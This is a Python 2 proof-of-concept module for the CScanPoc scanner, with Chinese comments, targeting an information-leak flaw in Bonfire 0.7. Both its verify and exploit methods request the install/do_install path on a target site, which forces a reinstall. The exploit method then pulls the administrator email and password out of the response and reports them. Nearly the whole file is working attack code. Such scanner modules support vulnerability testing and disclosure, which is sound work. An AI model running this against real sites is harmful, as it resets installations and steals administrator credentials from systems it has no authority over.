# coding: utf-8
import re
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'Bonfire_0101'  # 平台漏洞编号，留空
    name = 'Bonfire 0.7 /install.php 信息泄露'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INFO_LEAK  # 漏洞类型
    disclosure_date = '2014-09-17'  # 漏洞公布时间
    desc = '''
    由于install.php安装文件对已安装的程序进行检测后没有做好后续处理，导致执行/install/do_install的时候引发重安装而暴露管理员信息。
    '''  # 漏洞描述
    ref = 'http://www.mehmetince.net/ci-bonefire-reinstall-admin-account-vulnerability-analysis-exploit/',  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Bonfire'  # 漏洞应用名称
    product_version = '0.7'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '307f705c-0f4a-450b-b7b1-4546eee0ae69'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + '/index.php/install/do_install'
            try:
                content = urllib2.urlopen(urllib2.Request(verify_url)).read()
            except Exception, e:
                content = ''
                return

            if content:
                regular = re.findall(
                    'Your Email:\\s+<b>(.*?)</b><br/>\\s+Password:\\s+<b>(.*?)</b>', content)
                if regular:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;'.format(
                        target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            verify_url = self.target + '/index.php/install/do_install'
            try:
                content = urllib2.urlopen(urllib2.Request(verify_url)).read()
            except Exception, e:
                content = ''
                return

            if content:
                regular = re.findall(
                    'Your Email:\\s+<b>(.*?)</b><br/>\\s+Password:\\s+<b>(.*?)</b>', content)
                if regular:
                    (username, password) = regular[0]
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞;username={username}, Password={password}'.format(
                        target=self.target, name=self.vuln.name, username=username, password=password))

        except Exception, e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
